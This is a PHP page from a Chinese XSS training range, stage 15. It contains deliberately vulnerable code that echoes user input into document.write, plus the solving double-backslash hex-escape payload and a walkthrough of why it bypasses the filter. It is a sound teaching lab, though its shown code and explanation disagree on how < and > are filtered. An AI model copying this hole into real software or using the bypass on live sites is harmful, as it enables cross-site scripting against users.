<?php
/**
 * XSS Challenges - Stage #15
 * 16.2.1 十六进制绕过
 *
 * 漏洞成因：
 *   p1 回显到 input value 中：使用 htmlspecialchars 严格过滤
 *   p1 同时回显到 <script>document.write(...) 中：PHP 先清除单反斜杠 \x（\x3c→x3c），再过滤 <>
 *   双反斜杠 \\x3c 被保留到 JS 引擎，JS 解码 \\x3c → \x3c → <，触发 XSS
 *
 * 通关 Payload：
 *   \\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e
 */

$p1_raw = isset($_GET['p1']) && $_GET['p1'] !== '' ? $_GET['p1'] : '';
$searched = isset($_GET['p1']);

// input value：严格过滤（htmlspecialchars）
$filtered_value = htmlspecialchars($p1_raw, ENT_QUOTES, 'UTF-8');

// document.write 用：
// 1) str_replace("\x","x") 去掉 \x 中的反斜杠
//    \x3c → x3c（安全），\\x3c → \x3c（JS 引擎再解码为 <）
// 2) 过滤掉 <> 字符
$decoded = str_replace("\\x", "x", $p1_raw);
$filtered_js = htmlspecialchars($decoded, ENT_NOQUOTES | ENT_HTML5, 'UTF-8');
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=7">
  <title>XSS Challenges - Stage #15</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
<header>
  <a class="logo" href="../../index.php">极客事纪 XSS<span>·</span>Challenges靶场</a>
  <nav><a href="../../index.php">首页</a></nav>
</header>

<div class="stage-banner">
  <span class="stage-badge">STAGE #15</span>
  <h1>十六进制绕过</h1>
  <span class="difficulty">难度：★★★★☆ 进阶</span>
</div>

<main>
  <div class="task-card">
    <h2>任务目标</h2>
    <p>在搜索框中注入 XSS 代码，使页面弹出 <code>alert</code> 对话框，内容显示当前页面的 <strong>document.domain</strong>。<br>表单参数名为 <code style="color:#e94560;">p1</code>，通过 GET 方式提交。</p>
    <div class="hint">💡 提示（选中以下文字查看）：<span class="hint-content">input value 使用 htmlspecialchars 严格过滤。document.write 中单反斜杠 \x 被清除（\x3c→x3c），<> 被过滤。试试用双反斜杠 \\x3c 绕过，JS 引擎会将 \\x3c 解码为 &lt;。</span></div>
  </div>

  <div class="lab-area">
    <h2>🔍 靶场第十五关</h2>
    <?php if ($searched): ?>
    <div class="url-bar">GET <?php echo htmlspecialchars($_SERVER['PHP_SELF'], ENT_QUOTES, 'UTF-8'); ?>?<span class="url-key">p1</span>=<span class="url-val"><?php echo htmlspecialchars($p1_raw, ENT_QUOTES, 'UTF-8'); ?></span></div>
    <?php endif; ?>
    <form class="search-form" method="GET" action="">
      <input type="text" name="p1" value="<?php echo $filtered_value; ?>" />
      <button type="submit">搜索</button>
    </form>
    <?php if ($searched): ?>
    <div class="doc-area">
      <div class="doc-label">document.write 输出区域：</div>
      <script>document.write('<?php echo $filtered_js; ?>');</script>
    </div>
    <?php endif; ?>
  </div>

  <div class="knowledge-section">
    <button class="knowledge-toggle" onclick="this.parentElement.classList.toggle('expanded')">
      <span class="toggle-icon">▶</span> 知识点解析
    </button>
    <div class="knowledge-content">

    <div class="knowledge-item">
      <h3>后端 PHP 漏洞代码</h3>
      <p>本关有两个输出位置，过滤策略各不相同：</p>
      <div class="code-block"><span class="hl-php">&lt;?php</span>
<span class="hl-comment">// input value：严格过滤（htmlspecialchars ENT_QUOTES）</span>
<span class="hl-var">$filtered_value</span> = <span class="hl-fn">htmlspecialchars</span>(<span class="hl-var">$p1_raw</span>, <span class="hl-fn">ENT_QUOTES</span>, <span class="hl-str">'UTF-8'</span>);

<span class="hl-comment">// document.write 用：</span>
<span class="hl-comment">// 1) 去掉 \x 中的反斜杠：\x3c → x3c，\\x3c → \x3c</span>
<span class="hl-var">$decoded</span> = <span class="hl-fn">str_replace</span>(<span class="hl-str">"\\x"</span>, <span class="hl-str">"x"</span>, <span class="hl-var">$p1_raw</span>);
<span class="hl-comment">// 2) 过滤掉 &lt; &gt;</span>
<span class="hl-var">$filtered_js</span> = <span class="hl-fn">str_replace</span>([<span class="hl-str">'&lt;'</span>, <span class="hl-str">'&gt;'</span>], [<span class="hl-str">''</span>, <span class="hl-str">''</span>], <span class="hl-var">$decoded</span>);</div>
      <p>输出位置分析：</p>
      <div class="code-block"><span class="hl-comment">// 位置1：input 的 value 属性（严格过滤，安全 ✅）</span>
<span class="hl-tag">&lt;input</span> <span class="hl-attr">type</span>=<span class="hl-val">"text"</span> <span class="hl-attr">value</span>=<span class="hl-val">"&lt;?php echo $filtered_value; ?&gt;"</span> <span class="hl-tag">/&gt;</span>

<span class="hl-comment">// 位置2：document.write（将用户输入作为 JS 字符串写入页面，漏洞在这里 ❌）</span>
<span class="hl-tag">&lt;script&gt;</span>document.write('<span class="hl-val">&lt;?php echo $filtered_js; ?&gt;</span>');<span class="hl-tag">&lt;/script&gt;</span></div>
      <p>document.write 将用户输入作为 JS 字符串写入页面。PHP 用 <code>str_replace("\\x", "x")</code> 去掉 <code>\x</code> 中的反斜杠（<code>\x3c</code> → <code>x3c</code>），但双反斜杠 <code>\\x3c</code> 中只有第二个 <code>\x</code> 被匹配替换，第一个反斜杠保留，输出为 <code>\x3c</code>，JS 引擎会将其解码为 <code>&lt;</code>。</p>
    </div>

    <div class="knowledge-item">
      <h3>例1：十六进制编码绕过原理</h3>
      <p>JavaScript 支持十六进制字符转义序列：</p>
      <div class="code-block"><span class="hl-comment">// \xNN — 2位十六进制，对应 ASCII 字符（0x00 ~ 0xFF）</span>
<span class="hl-js">\x3c</span> <span class="hl-comment">// → &lt;（小于号，ASCII 60 = 十六进制 3C）</span>
<span class="hl-js">\x3e</span> <span class="hl-comment">// → &gt;（大于号，ASCII 62 = 十六进制 3E）</span>
<span class="hl-js">\x22</span> <span class="hl-comment">// → "（双引号，ASCII 34 = 十六进制 22）</span>

<span class="hl-comment">// JS 引擎会自动解析字符串中的 \x 转义</span>
<span class="hl-js">"\x3cscript\x3e"</span> <span class="hl-comment">// 等价于 "&lt;script&gt;"</span>
<span class="hl-fn">eval</span>(<span class="hl-js">"\x61\x6c\x65\x72\x74(1)"</span>) <span class="hl-comment">// 等价于 eval("alert(1)")</span></div>
      <p>本关用 <code>str_replace("\\x", "x")</code> 去掉反斜杠，再过滤 <code>&lt;</code> 和 <code>&gt;</code>。单反斜杠 <code>\x3c</code> 被完整替换为 <code>x3c</code>；但双反斜杠 <code>\\x3c</code> 中 <code>str_replace</code> 只匹配到第二个 <code>\x</code> 并替换，第一个反斜杠保留，输出为 <code>\x3c</code>，JS 引擎解码后得到字符 <code>&lt;</code>。</p>
    </div>

    <div class="knowledge-item">
      <h3>例2：Payload 构造</h3>
      <p>通关 Payload：</p>
      <div class="code-block">stage15.php?p1=<span class="hl-inject">\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e</span></div>
      <p>完整流程解析：</p>
      <div class="code-block"><span class="hl-comment">// === 失败 Payload（单反斜杠）===</span>
<span class="hl-comment">// 输入：\x3cscript\x3ealert(document.domain);\x3c/script\x3e</span>
<span class="hl-comment">// 1) str_replace("\\x", "x")：</span>
<span class="hl-comment">//    每个 \x 都被替换为 x → x3cscriptx3ealert(document.domain);x3c/scriptx3e</span>
<span class="hl-comment">// 2) str_replace 过滤 &lt; &gt;：没有 → 不变</span>
<span class="hl-comment">// JS 执行：document.write('x3cscriptx3ealert(document.domain);x3c/scriptx3e')</span>
<span class="hl-comment">// 页面显示纯文本 x3cscriptx3e...，❌ 不会触发 XSS</span>
<span class="hl-comment"></span>
<span class="hl-comment">// === 正确 Payload（双反斜杠）===</span>
<span class="hl-comment">// 输入：\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e</span>
<span class="hl-comment">// 1) str_replace("\\x", "x")：</span>
<span class="hl-comment">//    \\x3c 的字节序列：\ \ x 3 c</span>
<span class="hl-comment">//    从左到右扫描，找到位置1-2的 \x → 替换为 x</span>
<span class="hl-comment">//    位置0的 \ 不受影响 → 结果：\x3c</span>
<span class="hl-comment">// 2) str_replace 过滤 &lt; &gt;：没有 → 不变</span>
<span class="hl-comment">// JS 执行：document.write('\x3cscript\x3ealert(document.domain);\x3c/script\x3e')</span>
<span class="hl-comment">// JS 解码 \x3c → &lt;，\x3e → &gt;</span>
<span class="hl-comment">// 页面 DOM 中新增：&lt;script&gt;alert(document.domain);&lt;/script&gt;</span>
<span class="hl-comment">// 浏览器重新解析 HTML，script 标签执行 ✅</span></div>
      <p>关键点：<code>str_replace("\\x", "x")</code> 是简单的子串替换，在 <code>\\x3c</code> 中从左到右扫描时匹配到位置1-2的 <code>\x</code>，替换后第一个反斜杠不受影响，输出为 <code>\x3c</code>。JS 引擎将 <code>\x3c</code> 解码为 <code>&lt;</code>，从而构造出 HTML 标签。</p>
    </div>

    <div class="knowledge-item">
      <h3>例3：为什么直接注入 &lt;script&gt; 不行？</h3>
      <p>如果直接注入 <code>&lt;script&gt;</code>：</p>
      <div class="code-block"><span class="hl-comment">// 输入：&lt;script&gt;alert(document.domain);&lt;/script&gt;</span>
<span class="hl-comment">// 1) str_replace("\\x", "x")：没有 \x → 不匹配 → 原样保留</span>
<span class="hl-comment">// 2) str_replace 过滤 &lt; &gt;：</span>
<span class="hl-comment">//    &lt; 被删除 → scriptalert(document.domain);/script</span>
<span class="hl-comment">// JS 执行：document.write('scriptalert(document.domain);/script')</span>
<span class="hl-comment">// ❌ 标签被移除，不会触发 XSS</span></div>
      <p>这是因为 <code>&lt;</code> 和 <code>&gt;</code> 被 str_replace 直接删除了。单反斜杠 <code>\x3c</code> 也不行——<code>\x</code> 被替换为 <code>x</code> 后变成 <code>x3c</code>，JS 引擎只看到纯文本。</p>
      <p>十六进制序列 <code>\x3c</code> 的价值在于：它是 JS 引擎认识的转义字符，可以<strong>在 JS 上下文中动态生成 HTML 标签</strong>。只有<strong>双反斜杠</strong> <code>\\x3c</code> 才能在 <code>str_replace("\\x","x")</code> 后保留一个反斜杠，让 JS 引擎正确解码。</p>
    </div>

    <div class="knowledge-item">
      <h3>例4：常见十六进制字符对照</h3>
      <p>常用的 HTML 特殊字符对应的十六进制（\xNN）和 Unicode（\uNNNN）转义：</p>
      <div class="code-block"><span class="hl-comment">// 字符        ASCII   \xNN       \uNNNN</span>
<span class="hl-comment">// &lt;（小于号）  60      \x3c       \u003c</span>
<span class="hl-comment">// &gt;（大于号）  62      \x3e       \u003e</span>
<span class="hl-comment">// "（双引号）  34      \x22       \u0022</span>
<span class="hl-comment">// '（单引号）  39      \x27       \u0027</span>
<span class="hl-comment">// &amp;（&符号）  38      \x26       \u0026</span>
<span class="hl-comment">// /（斜杠）    47      \x2f       \u002f</span>
<span class="hl-comment">// \（反斜杠）  92      \x5c       \u005c</span>
<span class="hl-comment">// （空格）     32      \x20       \u0020</span>

<span class="hl-comment">// 完整 Payload 示例</span>
<span class="hl-val">\\x3cscript\\x3ealert(document.domain)\\x3c/script\\x3e</span>
<span class="hl-comment">// 经过 str_replace("\\x","x") 后 → \x3c...（单反斜杠）</span>
<span class="hl-comment">// 等价于 &lt;script&gt;alert(document.domain)&lt;/script&gt;</span></div>
      <p>注意 <code>\xNN</code> 只支持 2 位十六进制（00~FF，即 ASCII 范围），而 <code>\uNNNN</code> 支持 4 位十六进制（0000~FFFF，覆盖更多 Unicode 字符）。两者在 JS 引擎中都会被自动解码。</p>
    </div>

    <div class="knowledge-item">
      <h3>互动思考 💬</h3>
      <p><strong>问：</strong>如果将过滤规则改为同时过滤反斜杠（<code>\</code> → <code>\\</code>），十六进制绕过还能生效吗？</p>
      <p><strong>答：</strong>不能。如果改用 <code>str_replace('\\','\\\\')</code> 转义反斜杠，双反斜杠 <code>\\x3c</code> 会变成 <code>\\\\x3c</code>，JS 引擎不再将 <code>\\\\x3c</code> 视为转义序列，而是普通字符序列，<code>&lt;script&gt;</code> 不会被重新构建。</p>
      <p>本关的核心教训：<strong>简单的子串替换无法防御编码层绕过</strong>。<code>str_replace("\\x", "x")</code> 看似能清除十六进制转义，但忽略了双反斜杠 <code>\\x</code> 中只有第二个 <code>\x</code> 会被匹配。正确的做法是对所有输出使用 <code>htmlspecialchars()</code> 统一编码，避免将用户输入直接放入 JS 上下文。</p>
      <div class="code-block"><span class="hl-comment">// 更安全的做法</span>
<span class="hl-comment">// 方式1：去掉所有反斜杠</span>
<span class="hl-var">$filtered_js</span> = <span class="hl-fn">str_replace</span>(<span class="hl-str">'\\'</span>, <span class="hl-str">''</span>, <span class="hl-var">$p1_raw</span>);  <span class="hl-comment">// \x 和 \u 都失效</span>

<span class="hl-comment">// 方式2：使用 json_encode（推荐）</span>
<span class="hl-tag">&lt;script&gt;</span>
<span class="hl-var">var</span> safeData = <span class="hl-php">&lt;?php</span> <span class="hl-fn">echo</span> <span class="hl-fn">json_encode</span>(<span class="hl-var">$p1_raw</span>, <span class="hl-fn">JSON_HEX_TAG</span> | <span class="hl-fn">JSON_HEX_AMP</span> | <span class="hl-fn">JSON_HEX_APOS</span> | <span class="hl-fn">JSON_HEX_QUOT</span>); <span class="hl-php">?&gt;</span>;
<span class="hl-var">document</span>.<span class="hl-fn">write</span>(safeData);
<span class="hl-tag">&lt;/script&gt;</span>

<span class="hl-comment">// json_encode 会自动将所有特殊字符安全转义，</span>
<span class="hl-comment">// 从根本上杜绝转义序列注入</span></div>
    </div>
    </div>
  </div>
</main>

<footer> 极客事纪 XSS Challenges靶场 &nbsp;·&nbsp; 仅供 <span>安全学习</span> 使用 </footer>
</body>
</html>
